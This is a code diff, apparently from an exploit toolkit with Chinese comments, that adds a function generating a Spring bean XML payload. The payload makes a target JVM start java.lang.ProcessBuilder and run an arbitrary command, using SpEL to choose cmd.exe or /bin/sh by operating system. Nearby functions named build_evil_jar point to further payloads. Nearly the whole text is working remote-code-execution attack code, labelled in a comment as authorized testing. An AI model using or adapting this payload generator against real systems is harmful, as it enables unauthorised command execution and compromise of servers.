@@ -35,6 +35,48 @@ def build_bean_xml(file: str, content: str) -> bytes:
     return body.encode("utf-8")
 
 
+def build_bean_exec_xml(cmd: str) -> bytes:
+    """Spring XML：ProcessBuilder 执行自定义命令（目标侧按 OS 选 shell）。
+
+    通过 SpEL 在目标 JVM 上判断 Windows / *nix，再选 ``cmd.exe /c`` 或 ``/bin/sh -c``。
+    """
+    raw = (cmd or "id").strip() or "id"
+    esc = (
+        raw.replace("&", "&amp;")
+        .replace("<", "&lt;")
+        .replace(">", "&gt;")
+        .replace('"', "&quot;")
+        .replace("'", "&apos;")
+    )
+    # SpEL：运行时读目标 os.name，避免写死 /bin/sh
+    shell = (
+        "#{T(java.lang.System).getProperty('os.name','')"
+        ".toLowerCase().contains('win') ? 'cmd.exe' : '/bin/sh'}"
+    )
+    flag = (
+        "#{T(java.lang.System).getProperty('os.name','')"
+        ".toLowerCase().contains('win') ? '/c' : '-c'}"
+    )
+    xml = f"""\
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <!-- 授权测试：ProcessBuilder 执行自定义命令（SpEL 自适应 Windows / Linux） -->
+    <bean class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>{shell}</value>
+                <value>{flag}</value>
+                <value>{esc}</value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
+"""
+    return xml.encode("utf-8")
+
+
 def build_evil_jar() -> bytes:
     """打包 Groovy ASTTransformation SPI jar（含已编译 class 若存在，否则仅源码占位）。
 
